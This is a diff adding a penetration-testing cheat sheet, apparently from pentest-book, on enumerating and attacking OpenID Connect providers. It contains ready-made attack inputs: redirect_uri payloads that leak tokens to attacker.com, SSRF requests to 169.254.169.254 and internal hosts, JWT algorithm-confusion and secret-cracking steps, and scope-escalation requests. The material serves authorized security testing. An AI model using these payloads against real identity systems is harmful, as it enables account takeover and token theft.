@@ -1,0 +1,287 @@
+{
+    "title": "OIDC (OpenID Connect)",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Technologies",
+            "url": "/enumeration/webservices"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "Common Implementations",
+            "type": "code_block",
+            "content": [
+                "- Keycloak (Red Hat)",
+                "- Okta",
+                "- Auth0",
+                "- Azure AD",
+                "- Amazon Cognito (AWS)",
+                "- Google Identity",
+                "- GitLab",
+                "- Bitbucket Server (Atlassian)",
+                "- Salesforce"
+            ]
+        },
+        {
+            "heading": "Discovery & Enumeration",
+            "subheadings": [
+                {
+                    "heading": "Well-Known Endpoints",
+                    "type": "code_block",
+                    "content": [
+                        "# OIDC Configuration (always check this first)",
+                        "curl https://target.com/.well-known/openid-configuration | jq",
+                        "",
+                        "# Returns:",
+                        "# - authorization_endpoint",
+                        "# - token_endpoint",
+                        "# - userinfo_endpoint",
+                        "# - jwks_uri (JSON Web Key Set)",
+                        "# - supported scopes, claims, grant types",
+                        "",
+                        "# OAuth 2.0 Authorization Server Metadata",
+                        "curl https://target.com/.well-known/oauth-authorization-server | jq",
+                        "",
+                        "# WebFinger (for email-based discovery)",
+                        "curl \"https://target.com/.well-known/webfinger?resource=acct:user@target.com\""
+                    ]
+                },
+                {
+                    "heading": "Key Endpoints to Test",
+                    "type": "code_block",
+                    "content": [
+                        "/authorize",
+                        "/token",
+                        "/userinfo",
+                        "/logout",
+                        "/revoke",
+                        "/introspect",
+                        "/.well-known/openid-configuration",
+                        "/.well-known/jwks.json"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Token Attacks",
+            "subheadings": [
+                {
+                    "heading": "ID Token Manipulation",
+                    "type": "code_block",
+                    "content": [
+                        "# Decode ID token (JWT)",
+                        "echo \"eyJhbGciOiJSUzI1NiIs...\" | cut -d'.' -f2 | base64 -d | jq",
+                        "",
+                        "# Check for weak algorithms",
+                        "# Look for: alg: \"none\", \"HS256\" (when RS256 expected)",
+                        "",
+                        "# Algorithm confusion attack",
+                        "# Change RS256 to HS256 and sign with public key as secret"
+                    ]
+                },
+                {
+                    "heading": "Token Substitution",
+                    "type": "code_block",
+                    "content": [
+                        "# Use token from one client for another",
+                        "# 1. Get token from client A",
+                        "# 2. Present to client B's resource server",
+                        "# If aud (audience) claim not validated → vulnerable"
+                    ]
+                },
+                {
+                    "heading": "Refresh Token Abuse",
+                    "type": "code_block",
+                    "content": [
+                        "# Test if refresh token can be used without client_secret",
+                        "curl -X POST https://target.com/token \\",
+                        "  -d \"grant_type=refresh_token\" \\",
+                        "  -d \"refresh_token=REFRESH_TOKEN\" \\",
+                        "  -d \"client_id=CLIENT_ID\"",
+                        "",
+                        "# Test refresh token rotation",
+                        "# Can old refresh tokens still be used after rotation?"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Redirect URI Attacks",
+            "subheadings": [
+                {
+                    "heading": "Open Redirect",
+                    "type": "code_block",
+                    "content": [
+                        "# Test redirect_uri manipulation",
+                        "/authorize?client_id=X&redirect_uri=https://attacker.com",
+                        "/authorize?client_id=X&redirect_uri=https://target.com.attacker.com",
+                        "/authorize?client_id=X&redirect_uri=https://target.com%40attacker.com",
+                        "/authorize?client_id=X&redirect_uri=https://target.com/callback/../../../attacker",
+                        "",
+                        "# Bypass techniques",
+                        "redirect_uri=https://target.com/callback?next=https://attacker.com",
+                        "redirect_uri=https://target.com/callback#@attacker.com",
+                        "redirect_uri=https://target.com/callback%0d%0aLocation:%20https://attacker.com"
+                    ]
+                },
+                {
+                    "heading": "Token Leakage via Redirect",
+                    "type": "code_block",
+                    "content": [
+                        "# If token in URL fragment, test for:",
+                        "# 1. Open redirect to leak fragment",
+                        "# 2. Referrer header leakage",
+                        "# 3. History API access"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "SSRF via OIDC",
+            "type": "code_block",
+            "content": [
+                "# Test URI parameters for SSRF",
+                "redirect_uri=http://169.254.169.254/",
+                "redirect_uri=http://localhost:8080/",
+                "jwks_uri=http://internal-server/jwks.json",
+                "",
+                "# Metadata URL manipulation (for dynamic client registration)",
+                "curl -X POST https://target.com/register \\",
+                "  -H \"Content-Type: application/json\" \\",
+                "  -d '{\"redirect_uris\":[\"http://attacker.com\"],\"jwks_uri\":\"http://internal:8080\"}'"
+            ]
+        },
+        {
+            "heading": "State & Nonce Bypass",
+            "type": "code_block",
+            "content": [
+                "# Missing state parameter (CSRF)",
+                "# Remove state from authorization request",
+                "/authorize?client_id=X&redirect_uri=Y  # No state → CSRF possible",
+                "",
+                "# State not bound to session",
+                "# Reuse state value from another session",
+                "",
+                "# Missing nonce (replay attacks)",
+                "# Remove nonce from implicit flow requests"
+            ]
+        },
+        {
+            "heading": "Scope Abuse",
+            "type": "code_block",
+            "content": [
+                "# Request elevated scopes",
+                "/authorize?client_id=X&scope=openid+profile+email+admin+write",
+                "",
+                "# Test scope escalation after consent",
+                "# Get consent for 'read', then request token with 'read write'"
+            ]
+        },
+        {
+            "heading": "Specific Provider Attacks",
+            "subheadings": [
+                {
+                    "heading": "Keycloak",
+                    "type": "code_block",
+                    "content": [
+                        "# Admin console",
+                        "/auth/admin/",
+                        "/auth/admin/master/console/",
+                        "",
+                        "# Realm info",
+                        "/auth/realms/{realm}/.well-known/openid-configuration",
+                        "",
+                        "# CVE-2020-1714 - Adapter token spoofing",
+                        "# CVE-2020-1728 - SAML authentication bypass"
+                    ]
+                },
+                {
+                    "heading": "Azure AD",
+                    "type": "code_block",
+                    "content": [
+                        "# Tenant enumeration",
+                        "curl https://login.microsoftonline.com/{tenant}/.well-known/openid-configuration",
+                        "",
+                        "# Guest user abuse",
+                        "# B2B guest tokens may have unexpected permissions"
+                    ]
+                },
+                {
+                    "heading": "AWS Cognito",
+                    "type": "code_block",
+                    "content": [
+                        "# User pool info",
+                        "curl https://cognito-idp.{region}.amazonaws.com/{userPoolId}/.well-known/openid-configuration",
+                        "",
+                        "# Test for self-registration if enabled",
+                        "# Check attribute-based access control bypass"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Tools",
+            "type": "code_block",
+            "content": [
+                "# JWT testing",
+                "jwt_tool TOKEN -T  # Tamper mode",
+                "jwt_tool TOKEN -C -d wordlist.txt  # Crack secret",
+                "",
+                "# Burp extensions",
+                "# - JSON Web Tokens",
+                "# - OAuth 2.0 Scanner",
+                "# - SAML Raider (for SAML/OIDC hybrid)",
+                "",
+                "# OIDC testing",
+                "# https://github.com/AhmedMohamedDev/oidc-bash-client"
+            ]
+        },
+        {
+            "heading": "Related Topics",
+            "type": "list",
+            "content": [
+                "OAuth - OIDC is built on OAuth 2.0",
+                "JWT - ID tokens are JWTs",
+                "SSRF - URI parameters can be SSRF vectors"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2026-02-03T14:05:45.496Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/oidc-open-id-connect.md",
+        "previous_page": {
+            "title": "Jira",
+            "url": "/enumeration/webservices/jira"
+        },
+        "next_page": {
+            "title": "ELK",
+            "url": "/enumeration/webservices/elk"
+        }
+    }
+}
